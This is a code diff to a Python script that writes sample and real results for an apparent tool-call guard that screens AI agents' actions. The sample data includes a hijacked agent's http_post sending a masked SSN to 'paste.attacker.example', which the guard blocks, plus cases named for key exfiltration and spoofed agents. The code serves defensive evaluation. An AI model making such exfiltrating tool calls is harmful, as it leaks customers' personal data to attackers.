@@ -913,6 +913,66 @@ def real_net_eval() -> dict | None:
             "sessions_per_seed": blob.get("sessions_per_seed", 0), "rows": rows, "triage": triage, "agent10": agent10}
 
 
+TG_RESULT = ROOT / "risk/wilson_net/results/toolguard.json"
+
+
+def _tg_rate(k, n):
+    return {"k": k, "n": n, "rate": round(k / n, 4) if n else 0.0}
+
+
+def sample_toolguard() -> dict:
+    """Illustrative values in the frozen toolguard.json shape. Masked values only."""
+    def row(b, f, ls, pages, stop, miss):
+        return {"blocked_before_run": _tg_rate(*b), "false_blocks": _tg_rate(*f), "legit_sensitive_blocked": _tg_rate(*ls),
+                "pages_per_1000": pages, "exposure_stopped_usd": stop, "exposure_missed_usd": miss}
+    def call(i, tool, agent, host, classes, args, score, decision, reasons):
+        return {"call_index": i, "tool": tool, "agent_id": agent, "dest_host": host, "classes": classes,
+                "masked_args": args, "score": score, "decision": decision, "reasons": reasons}
+    legit = [
+        call(0, "lookup_account", "kyc-12", "", [], {"customer_id": "cus_***4417"}, 0.08, "allow", []),
+        call(1, "http_post", "kyc-12", "idv.vendor.example", ["ssn"], {"url": "https://idv.vendor.example/verify", "body": {"ssn": "***-**-4321"}}, 0.12, "allow", ["sensitive data to an approved destination"]),
+        call(2, "update_contact", "kyc-12", "", [], {"customer_id": "cus_***4417", "status": "verified"}, 0.15, "allow", []),
+    ]
+    attack = [
+        call(0, "lookup_account", "service-58", "", [], {"customer_id": "cus_***9032"}, 0.06, "allow", []),
+        call(1, "http_post", "service-58", "paste.attacker.example", ["ssn"], {"url": "https://paste.attacker.example/c", "body": {"ssn": "***-**-4321"}}, 1.0, "block_page", ["egress with sensitive class to a host that is not approved"]),
+        call(2, "send_email", "service-58", "", [], {"to": "***@***", "subject": "(not run)"}, 0.0, "allow", ["session token revoked; call never ran"]),
+    ]
+    cases = {
+        "hero_legit": ("allow", 0.0, "none", None), "hero_attack": ("block_page", 150.0, "person", 1),
+        "bot_campaign": ("block_page", 1500.0, "bot", 1), "spoofed_agent": ("block_page", 60000.0, "bot", 0),
+        "key_exfil": ("block_page", 1000000.0, "person", 1), "slow_drip_lookalike": ("block_page", 150.0, "person", 0),
+        "email_not_on_file": ("hold", 0.0, "none", 1),
+    }
+    return {
+        "sample": True, "seeds": [], "sessions_per_seed": 0,
+        "rows": {"guard": row((290, 300), (30, 1200), (0, 40), 12.0, 4_800_000.0, 12_000.0),
+                 "http_layer_only": row((0, 300), (0, 1200), (0, 40), 0.0, 0.0, 4_812_000.0),
+                 "keyword_screen": row((60, 300), (96, 1200), (0, 40), 95.0, 900_000.0, 3_912_000.0)},
+        "by_case": {"hero_attack": {"blocked_before_run": _tg_rate(5, 5)}},
+        "hero": {"hero_legit": legit, "hero_attack": attack},
+        "cases": {k: {"decision": d, "exposure_usd": e, "actor": a, "first_block_index": f} for k, (d, e, a, f) in cases.items()},
+        "agents": [{"agent_id": "service-58", "agent_type": "service", "score": 1.0, "hijacked": True},
+                   {"agent_id": "kyc-12", "agent_type": "kyc", "score": 0.15, "hijacked": False},
+                   {"agent_id": "support-07", "agent_type": "support", "score": 0.22, "hijacked": False},
+                   {"agent_id": "disputes-03", "agent_type": "disputes", "score": 0.31, "hijacked": False},
+                   {"agent_id": "payments-21", "agent_type": "payments", "score": 0.74, "hijacked": True},
+                   {"agent_id": "service-44", "agent_type": "service", "score": 0.09, "hijacked": False}],
+    }
+
+
+def real_toolguard() -> dict | None:
+    """risk/wilson_net/results/toolguard.json in the frozen shape; passed through with sample forced false."""
+    if not TG_RESULT.is_file():
+        return None
+    blob = json.loads(TG_RESULT.read_text(encoding="utf-8"))
+    if not isinstance(blob.get("rows"), dict) or not isinstance(blob.get("hero"), dict):
+        return None
+    out = dict(blob)
+    out["sample"] = False
+    return out
+
+
 def write_to(folder: Path, name: str, obj: dict) -> None:
     folder.mkdir(parents=True, exist_ok=True)
     (folder / name).write_text(json.dumps(obj, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
@@ -928,9 +988,10 @@ def net_and_fleet(force_sample: bool) -> None:
         obj = json.loads(FLEET_SAMPLE_SRC.read_text(encoding="utf-8"))
         obj["sample"] = True
         write_to(SAMPLES, "fleet.json", obj)
+    write_to(SAMPLES, "toolguard.json", sample_toolguard())
     if force_sample:
         return
-    for name, real in (("net-hero.json", real_net_hero), ("net-eval.json", real_net_eval)):
+    for name, real in (("net-hero.json", real_net_hero), ("net-eval.json", real_net_eval), ("toolguard.json", real_toolguard)):
         obj = real()
         if obj is not None:
             write_to(DATA, name, obj)
